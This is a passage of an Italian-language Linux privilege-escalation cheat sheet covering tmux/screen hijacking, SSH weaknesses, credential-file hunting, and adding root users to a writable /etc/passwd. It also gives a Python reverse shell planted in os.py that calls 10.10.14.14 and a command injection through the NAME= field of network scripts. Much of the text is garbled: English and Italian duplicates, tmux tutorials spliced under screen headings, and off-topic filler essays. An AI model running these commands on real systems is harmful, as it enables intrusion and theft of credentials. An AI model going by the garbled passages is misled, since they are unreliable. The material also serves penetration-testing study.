Nelle **versioni più recenti** sarai in grado di **connetterti** solo alle sessioni di screen del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.

### Intercettazione delle sessioni di screen

**Elenco delle sessioni di screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Collegarsi a una sessione**

To attach to a session, use the following command:

Per collegarsi a una sessione, utilizzare il seguente comando:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

Sostituire `<session_name>` con il nome della sessione a cui si desidera collegarsi.

If you are not sure about the session name, you can list all the active sessions using the command:

Se non si è sicuri del nome della sessione, è possibile elencare tutte le sessioni attive utilizzando il comando:

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

Verrà visualizzato un elenco di tutte le sessioni attive insieme ai loro nomi.

**Detach from a session**

**Scollegarsi da una sessione**

To detach from a session, use the following key combination:

Per scollegarsi da una sessione, utilizzare la seguente combinazione di tasti:

```
Ctrl + b, d
```

This will detach you from the current session and return you to the shell.

Ciò ti scollegherà dalla sessione corrente e ti riporterà alla shell.

**Create a new session**

**Creare una nuova sessione**

To create a new session, use the following command:

Per creare una nuova sessione, utilizzare il seguente comando:

```bash
tmux new-session -s <session_name>
```

Replace `<session_name>` with the desired name for the new session.

Sostituire `<session_name>` con il nome desiderato per la nuova sessione.

**Switch between sessions**

**Passare da una sessione all'altra**

To switch between sessions, use the following key combination:

Per passare da una sessione all'altra, utilizzare la seguente combinazione di tasti:

```
Ctrl + b, s
```

This will display a list of all the available sessions. Use the arrow keys to navigate and press Enter to select a session.

Verrà visualizzato un elenco di tutte le sessioni disponibili. Utilizzare i tasti freccia per navigare e premere Invio per selezionare una sessione.

**Kill a session**

**Terminare una sessione**

To kill a session, use the following command:

Per terminare una sessione, utilizzare il seguente comando:

```bash
tmux kill-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to kill.

Sostituire `<session_name>` con il nome della sessione che si desidera terminare.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Hijacking delle sessioni di tmux

Questo era un problema con le **vecchie versioni di tmux**. Non ero in grado di hijackare una sessione di tmux (v2.1) creata da root come utente non privilegiato.

**Elenco delle sessioni di tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Collegarsi a una sessione**

To attach to a session, use the following command:

Per collegarsi a una sessione, utilizzare il seguente comando:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

Sostituire `<session_name>` con il nome della sessione a cui si desidera collegarsi.

If you are not sure about the name of the session, you can list all the available sessions using the command:

Se non si è sicuri del nome della sessione, è possibile elencare tutte le sessioni disponibili utilizzando il comando:

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

Verrà visualizzato un elenco di tutte le sessioni attive insieme ai loro nomi.

**Detach from a session**

**Scollegarsi da una sessione**

To detach from a session, simply press `Ctrl + b` followed by `d`.

Per scollegarsi da una sessione, premere semplicemente `Ctrl + b` seguito da `d`.

**Create a new session**

**Creare una nuova sessione**

To create a new session, use the following command:

Per creare una nuova sessione, utilizzare il seguente comando:

```bash
tmux new-session -s <session_name>
```

Replace `<session_name>` with the desired name for the new session.

Sostituire `<session_name>` con il nome desiderato per la nuova sessione.

**Switch between sessions**

**Passare da una sessione all'altra**

To switch between sessions, use the following command:

Per passare da una sessione all'altra, utilizzare il seguente comando:

```bash
tmux switch-client -t <session_name>
```

Replace `<session_name>` with the name of the session you want to switch to.

Sostituire `<session_name>` con il nome della sessione a cui si desidera passare.

**Kill a session**

**Terminare una sessione**

To kill a session, use the following command:

Per terminare una sessione, utilizzare il seguente comando:

```bash
tmux kill-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to kill.

Sostituire `<session_name>` con il nome della sessione che si desidera terminare.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Controlla **Valentine box da HTB** per un esempio.

## SSH

### Debian OpenSSL PRNG Prevedibile - CVE-2008-0166

Tutte le chiavi SSL e SSH generate su sistemi basati su Debian (Ubuntu, Kubuntu, ecc.) tra settembre 2006 e il 13 maggio 2008 potrebbero essere affette da questo bug.\
Questo bug si verifica durante la creazione di una nuova chiave ssh in quei sistemi operativi, poiché erano possibili solo **32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e **avendo la chiave pubblica ssh è possibile cercare la corrispondente chiave privata**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valori di configurazione interessanti per SSH

* **PasswordAuthentication:** Specifica se l'autenticazione tramite password è consentita. Il valore predefinito è `no`.
* **PubkeyAuthentication:** Specifica se l'autenticazione tramite chiave pubblica è consentita. Il valore predefinito è `yes`.
* **PermitEmptyPasswords**: Quando l'autenticazione tramite password è consentita, specifica se il server consente l'accesso agli account con stringhe di password vuote. Il valore predefinito è `no`.

### PermitRootLogin

Specifica se l'utente root può effettuare l'accesso tramite ssh, il valore predefinito è `no`. Possibili valori:

* `yes`: root può effettuare l'accesso utilizzando password e chiave privata
* `without-password` o `prohibit-password`: root può effettuare l'accesso solo con una chiave privata
* `forced-commands-only`: Root può effettuare l'accesso solo utilizzando una chiave privata e se sono specificate le opzioni dei comandi
* `no` : no

### AuthorizedKeysFile

Specifica i file che contengono le chiavi pubbliche che possono essere utilizzate per l'autenticazione dell'utente. Può contenere token come `%h`, che verranno sostituiti con la directory home. **Puoi indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi dalla home dell'utente**. Ad esempio:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Quella configurazione indicherà che se si tenta di effettuare il login con la chiave **privata** dell'utente "**testusername**", ssh confronta la chiave pubblica della tua chiave con quelle presenti in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

L'inoltro dell'agente SSH consente di **utilizzare le tue chiavi SSH locali invece di lasciare le chiavi** (senza passphrase!) sul tuo server. Quindi, sarai in grado di **saltare** tramite ssh **su un host** e da lì **saltare su un altro** host **utilizzando** la **chiave** presente nel tuo **host iniziale**.

È necessario impostare questa opzione in `$HOME/.ssh.config` come segue:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*`, ogni volta che l'utente passa a una macchina diversa, quella macchina sarà in grado di accedere alle chiavi (che è un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** l'inoltro dell'agente ssh con la parola chiave `AllowAgentForwarding` (impostazione predefinita è consentire).

Se scopri che l'inoltro dell'agente è configurato in un ambiente, leggi la seguente pagina poiché **potresti sfruttarlo per ottenere privilegi elevati**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## File Interessanti

### File di Profili

Il file `/etc/profile` e i file in `/etc/profile.d/` sono **script che vengono eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno di questi file, puoi ottenere privilegi elevati**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato uno script di profilo strano, è necessario controllarlo per **dettagli sensibili**.

### File Passwd/Shadow

A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero avere un nome diverso o potrebbe esserci un backup. Pertanto, è consigliato **trovarli tutti** e **verificare se è possibile leggerli** per vedere **se ci sono hash** all'interno dei file:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcune occasioni è possibile trovare **hash delle password** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd scrivibile

Prima di tutto, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Quindi aggiungi l'utente `hacker` e inserisci la password generata.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi utilizzare il comando `su` con `hacker:hacker`

In alternativa, puoi utilizzare le seguenti righe per aggiungere un utente fittizio senza password.\
ATTENZIONE: potresti compromettere la sicurezza attuale della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nei sistemi BSD, `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`, inoltre `/etc/shadow` viene rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Ad esempio, puoi scrivere in qualche **file di configurazione del servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Ad esempio, se la macchina sta eseguendo un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/**, allora puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Il tuo backdoor verrà eseguito la prossima volta che Tomcat viene avviato.

### Controlla le Cartelle

Le seguenti cartelle potrebbero contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non sarai in grado di leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Posizione strana/File di proprietà

Sometimes, during a penetration test or a security audit, you may come across files or directories in unusual locations or owned by unexpected users. These findings can be indicative of a potential privilege escalation vulnerability.

Here are some common locations and files to look out for:

#### /tmp

The `/tmp` directory is often used for temporary files. However, it can also be a hiding place for malicious files or scripts. Check for any suspicious files or directories in this location.

#### /var/tmp

Similar to `/tmp`, the `/var/tmp` directory is used for temporary files. It's worth checking for any unusual files or directories here as well.

#### /dev/shm

The `/dev/shm` directory is a shared memory location in Linux. It can be used to store temporary files or communicate between processes. Look for any unexpected files or directories in this location.

#### /var/www/html

The `/var/www/html` directory is commonly used for web server files. If you find any files or directories owned by non-standard users in this location, it could indicate a potential vulnerability.

#### /home

The `/home` directory contains user home directories. Check for any files or directories owned by users who shouldn't have access to them.

#### /root

The `/root` directory is the home directory for the root user. Any files or directories owned by other users in this location should be investigated.

#### SUID/SGID files

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be set on executable files. These permissions allow the file to be executed with the privileges of the file owner or group owner, respectively. Look for any files with these permissions that are owned by non-standard users.

#### World-writable files

Files with world-writable permissions (e.g., `777`) can be modified by any user on the system. Check for any files with these permissions that are owned by non-standard users.

By identifying and investigating files or directories in unusual locations or owned by unexpected users, you can potentially uncover privilege escalation vulnerabilities and strengthen the security of the system.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti

To identify recently modified files on a Linux system, you can use the following command:

```bash
find / -type f -mmin -10
```

This command will search for files (`-type f`) that have been modified within the last 10 minutes (`-mmin -10`) starting from the root directory (`/`).

You can adjust the time frame by changing the value after `-mmin` to your desired number of minutes.

Keep in mind that this command may take some time to execute, especially if you have a large filesystem. Additionally, it requires root privileges to search all directories.

Once you have the list of modified files, you can further investigate them to determine if any unauthorized changes have been made.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File di database Sqlite

Sqlite è un popolare sistema di gestione di database leggero che utilizza un singolo file per memorizzare i dati. Questi file di database hanno estensione `.db` o `.sqlite`. 

Durante un test di penetrazione, potresti trovare file di database Sqlite che contengono informazioni sensibili come credenziali di accesso, dati personali o altre informazioni riservate. 

Per ottenere accesso a queste informazioni, puoi utilizzare diverse tecniche di escalation dei privilegi. Alcuni esempi includono:

- **Analisi dei permessi del file**: controlla i permessi del file di database Sqlite per vedere se è possibile accedervi o modificarlo.
- **Iniezione di comandi Sqlite**: utilizza comandi Sqlite per eseguire query sul database e ottenere informazioni sensibili.
- **Sfruttamento di vulnerabilità**: cerca vulnerabilità note nel software che utilizza il database Sqlite e sfruttale per ottenere accesso privilegiato.

È importante notare che l'accesso non autorizzato o la modifica di file di database Sqlite è un'attività illegale, a meno che tu non abbia il permesso esplicito di farlo come parte di un test di penetrazione autorizzato.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### File \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml

I seguenti file possono contenere informazioni sensibili o configurazioni che possono essere sfruttate per l'escalation dei privilegi:

- \*\_history: Questo file contiene la cronologia dei comandi eseguiti dall'utente corrente nella shell.
- .sudo\_as\_admin\_successful: Questo file registra le volte in cui l'utente ha eseguito con successo un comando con privilegi di amministratore utilizzando sudo.
- profile: Questo file contiene le impostazioni di configurazione dell'ambiente per l'utente corrente.
- bashrc: Questo file contiene le impostazioni di configurazione specifiche per la shell Bash dell'utente corrente.
- httpd.conf: Questo file contiene la configurazione del server web Apache.
- .plan: Questo file può contenere informazioni sul piano o sullo stato dell'utente corrente.
- .htpasswd: Questo file contiene le credenziali degli utenti per l'autenticazione HTTP di base.
- .git-credentials: Questo file contiene le credenziali per l'autenticazione Git.
- .rhosts: Questo file contiene una lista di host fidati per l'autenticazione remota.
- hosts.equiv: Questo file contiene una lista di host fidati per l'autenticazione remota.
- Dockerfile: Questo file contiene le istruzioni per la creazione di un'immagine Docker.
- docker-compose.yml: Questo file contiene la configurazione per l'orchestrazione di container Docker utilizzando Docker Compose.
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti

In Linux, files and directories that are prefixed with a dot (.) are considered hidden files. These files are not displayed by default when using commands like `ls`. However, you can still access and manipulate them.

To view hidden files in a directory, you can use the `-a` flag with the `ls` command:

```bash
ls -a
```

This will display all files, including hidden ones.

To make a file or directory hidden, simply rename it and add a dot (.) at the beginning of its name. For example, to hide a file named `secret.txt`, you can rename it to `.secret.txt`.

Keep in mind that hiding a file does not provide any security. It is merely a way to prevent accidental modification or deletion.

### File nascosti

In Linux, i file e le directory che hanno un punto (.) come prefisso sono considerati file nascosti. Questi file non vengono visualizzati di default quando si utilizzano comandi come `ls`. Tuttavia, è comunque possibile accedervi e manipolarli.

Per visualizzare i file nascosti in una directory, è possibile utilizzare l'opzione `-a` con il comando `ls`:

```bash
ls -a
```

Questo mostrerà tutti i file, inclusi quelli nascosti.

Per rendere un file o una directory nascosti, è sufficiente rinominarli e aggiungere un punto (.) all'inizio del nome. Ad esempio, per nascondere un file chiamato `segreto.txt`, è possibile rinominarlo in `.segreto.txt`.

Tieni presente che nascondere un file non fornisce alcuna sicurezza. È semplicemente un modo per evitare modifiche o cancellazioni accidentali.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binari nel PATH**

Se un utente ha la possibilità di eseguire uno script o un binario che si trova nel PATH, potrebbe essere possibile sfruttare questa situazione per ottenere privilegi elevati.

#### **Cosa fare:**

1. Identificare gli script o i binari presenti nel PATH dell'utente.
2. Verificare se è possibile modificare o sostituire uno di questi script o binari.
3. Se è possibile, creare uno script o un binario personalizzato che esegua il codice desiderato con privilegi elevati.
4. Assicurarsi che lo script o il binario personalizzato venga eseguito al posto di quello originale.

#### **Esempio:**

Supponiamo che l'utente "alice" abbia il binario "myapp" nel suo PATH e che questo binario venga eseguito con privilegi elevati. Se si riesce a sostituire il binario "myapp" con uno script personalizzato che esegue un comando di shell con privilegi elevati, si può ottenere l'esecuzione di quel comando con i privilegi dell'utente "alice".

```bash
#!/bin/bash
/bin/bash -p
```

In questo esempio, lo script personalizzato sostituisce il binario "myapp" e esegue una shell di root con privilegi elevati.

#### **Contromisure:**

- Limitare i privilegi degli script o dei binari nel PATH degli utenti.
- Verificare regolarmente l'integrità degli script o dei binari nel PATH.
- Utilizzare meccanismi di controllo degli accessi per limitare l'esecuzione di script o binari non autorizzati.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **File Web**

I file web sono file che vengono utilizzati per la creazione di siti web. Questi file possono includere codice HTML, CSS, JavaScript e altri tipi di file multimediali come immagini e video. I file web sono ospitati su un server web e possono essere accessibili tramite un browser web.

I file web possono essere vulnerabili a varie tecniche di hacking, come l'iniezione di codice, la divulgazione di informazioni sensibili e l'esecuzione di script dannosi. È importante proteggere i file web da queste minacce implementando misure di sicurezza come l'uso di firewall, l'autenticazione sicura e la crittografia dei dati sensibili.

Inoltre, è fondamentale mantenere i file web aggiornati con le ultime patch di sicurezza e utilizzare pratiche di sviluppo sicure per evitare vulnerabilità comuni come la mancata gestione degli input utente e la mancata validazione dei dati.

Infine, è consigliabile effettuare regolarmente test di penetrazione sui file web per identificare eventuali vulnerabilità e prendere le misure necessarie per correggerle.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backup**

I backup dei dati sono una pratica essenziale per garantire la sicurezza e l'integrità delle informazioni. In caso di perdita o danneggiamento dei dati, i backup possono essere utilizzati per ripristinare le informazioni importanti. Ecco alcuni punti da considerare per garantire un'efficace strategia di backup:

- **Frequenza dei backup**: è consigliabile effettuare backup regolari dei dati critici. La frequenza dipende dalla quantità di dati che vengono modificati o aggiunti nel corso del tempo. Ad esempio, i dati che vengono aggiornati frequentemente richiedono backup più frequenti rispetto a quelli che cambiano raramente.

- **Metodo di backup**: esistono diversi metodi di backup, come il backup completo, il backup incrementale e il backup differenziale. È importante scegliere il metodo più adatto alle proprie esigenze. Ad esempio, il backup completo copia tutti i dati, mentre il backup incrementale copia solo i dati modificati dall'ultimo backup.

- **Archiviazione dei backup**: i backup dovrebbero essere archiviati in un luogo sicuro e separato dai dati originali. Ciò protegge i backup da eventi come il furto, l'incendio o il danneggiamento fisico.

- **Verifica dei backup**: è importante verificare periodicamente l'integrità dei backup per assicurarsi che siano completi e utilizzabili. Ciò può essere fatto tramite test di ripristino o utilizzando strumenti di verifica dei backup.

- **Offsite backup**: è consigliabile conservare una copia dei backup in un luogo esterno alla posizione fisica dei dati originali. Questo protegge i dati da eventi come il danneggiamento fisico del sito o il furto.

- **Crittografia dei backup**: per garantire la sicurezza dei dati, è consigliabile crittografare i backup. Ciò protegge i dati da accessi non autorizzati in caso di furto o smarrimento dei backup.

- **Pianificazione dei backup**: è importante pianificare i backup in modo da garantire che vengano eseguiti regolarmente e in modo coerente. È possibile utilizzare strumenti di pianificazione o script per automatizzare il processo di backup.

Seguendo queste linee guida, è possibile creare una strategia di backup efficace che protegga i dati critici e garantisca la loro disponibilità in caso di perdita o danneggiamento.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### File conosciuti contenenti password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi possibili file che potrebbero contenere password**.\
Un **altro strumento interessante** che puoi utilizzare per farlo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source utilizzata per recuperare molte password memorizzate su un computer locale per Windows, Linux e Mac.

### Log

Se riesci a leggere i log, potresti essere in grado di trovare **informazioni interessanti/confidenziali al loro interno**. Più strano è il log, più interessante sarà (probabilmente).\
Inoltre, alcuni log di **audit "cattivi"** (con backdoor?) potrebbero consentirti di **registrare password** all'interno dei log di audit come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per **leggere i log del gruppo** [**adm**](interesting-groups-linux-pe/#adm-group) sarà davvero utile.

### File di shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ricerca generica delle credenziali/Regex

Dovresti anche controllare i file che contengono la parola "**password**" nel **nome** o nel **contenuto**, e controllare anche gli indirizzi IP e le email nei log, o le regex degli hash.\
Non elencherò qui come fare tutto questo, ma se sei interessato puoi controllare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.

## File scrivibili

### Hijacking della libreria Python

Se sai da **dove** uno script Python verrà eseguito e **puoi scrivere all'interno** di quella cartella o **modificare le librerie Python**, puoi modificare la libreria OS e inserire un backdoor (se puoi scrivere dove lo script Python verrà eseguito, copia e incolla la libreria os.py).

Per **inserire un backdoor nella libreria**, aggiungi semplicemente alla fine della libreria os.py la seguente riga (cambia IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Sfruttare l'esposizione di Logrotate

Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di registro o sulle directory genitori di ottenere potenzialmente privilegi elevati. Ciò accade perché `logrotate`, spesso in esecuzione come **root**, può essere manipolato per eseguire file arbitrari, specialmente nelle directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_, ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.

{% hint style="info" %}
Questa vulnerabilità riguarda la versione `3.18.0` e precedenti di `logrotate`
{% endhint %}

Ulteriori informazioni dettagliate sulla vulnerabilità possono essere trovate in questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

È possibile sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registri di nginx)**, quindi ogni volta che si scopre di poter modificare i registri, verificare chi gestisce quei registri e controllare se è possibile ottenere privilegi elevati sostituendo i registri con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento alla vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<qualunque cosa>` in _/etc/sysconfig/network-scripts_ **o** può **modificare** uno già esistente, allora il **sistema è compromesso**.

Gli script di rete, ad esempio _ifcg-eth0_, vengono utilizzati per le connessioni di rete. Sono identici ai file .INI. Tuttavia, vengono \~sourced\~ su Linux da Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non viene gestito correttamente. Se hai **spazi bianchi/vuoti nel nome, il sistema cerca di eseguire la parte dopo lo spazio bianco/vuoto**. Ciò significa che **tutto ciò che segue il primo spazio bianco viene eseguito come root**.

Ad esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota lo spazio vuoto tra Network e /bin/id_)

### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` contiene **script** per System V init (SysVinit), il **classico sistema di gestione dei servizi Linux**. Include script per `avviare`, `fermare`, `riavviare` e talvolta `ricaricare` i servizi. Questi possono essere eseguiti direttamente o tramite link simbolici presenti in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

D'altra parte, `/etc/init` è associato a **Upstart**, un sistema di gestione dei servizi più recente introdotto da Ubuntu, che utilizza file di configurazione per le attività di gestione dei servizi. Nonostante il passaggio a Upstart, gli script di SysVinit vengono ancora utilizzati insieme alle configurazioni di Upstart grazie a uno strato di compatibilità in Upstart.

**systemd** emerge come un moderno inizializzatore e gestore dei servizi, offrendo funzionalità avanzate come l'avvio su richiesta dei daemon, la gestione dei montaggi automatici e gli snapshot dello stato di sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti di distribuzione e in `/etc/systemd/system/` per le modifiche degli amministratori, semplificando il processo di amministrazione di sistema.

## Altri trucchi

### Escalation dei privilegi NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Fuga da shell limitate

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Protezioni di sicurezza del kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Ulteriori aiuti

[Binari impacket statici](https://github.com/ropnop/impacket\_static\_binaries)

## Strumenti di Privesc Linux/Unix

### **Miglior strumento per cercare vettori di escalation dei privilegi locali Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opzione -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera le vulnerabilità del kernel in Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accesso fisico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Raccolta di altri script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Riferimenti

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
